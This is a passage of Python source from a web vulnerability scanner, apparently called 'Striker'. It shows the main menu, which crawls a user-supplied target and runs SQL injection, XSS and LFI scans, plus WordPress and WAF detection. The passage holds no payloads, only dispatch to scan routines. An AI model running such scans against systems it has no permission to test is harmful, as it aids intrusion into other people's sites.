                crawled = crawler.crawl()
                urls = [u for u, d in crawled.items() if d.parameters]
                scanner.scan_sql_injection(urls)
            except Exception as e:
                log_error(f"SQLi scan error: {str(e)}")

        elif choice == "3":
            target = input("Enter target URL: ").strip()
            if not is_valid_url(target):
                log_error("Invalid URL")
                continue
            try:
                scanner = StrikerScanner(target)
                crawler = AdvancedCrawler(target, max_depth=2)
                crawled = crawler.crawl()
                urls = [u for u, d in crawled.items() if d.parameters]
                scanner.scan_xss(urls)
            except Exception as e:
                log_error(f"XSS scan error: {str(e)}")

        elif choice == "4":
            target = input("Enter target URL: ").strip()
            if not is_valid_url(target):
                log_error("Invalid URL")
                continue
            try:
                scanner = StrikerScanner(target)
                crawler = AdvancedCrawler(target, max_depth=2)
                crawled = crawler.crawl()
                urls = [u for u, d in crawled.items() if d.parameters]
                scanner.scan_lfi(urls)
            except Exception as e:
                log_error(f"LFI scan error: {str(e)}")

        elif choice == "5":
            target = input("Enter target URL: ").strip()
            if not is_valid_url(target):
                log_error("Invalid URL")
                continue
            try:
                detector = WordPressDetector(target)
                detector.scan()
            except Exception as e:
                log_error(f"WordPress detection error: {str(e)}")

        elif choice == "6":
            target = input("Enter target URL: ").strip()
            if not is_valid_url(target):
                log_error("Invalid URL")
                continue
            try:
                waf = WAFDetector(target)
                waf.scan()
            except Exception as e:
                log_error(f"WAF detection error: {str(e)}")

        elif choice == "7":
            log_error("Subdomain enumeration not implemented yet")

        elif choice == "0":
            log_success("Exiting...")
            break

        else:
            log_error("Invalid option")

if __name__ == "__main__":
    main_menu()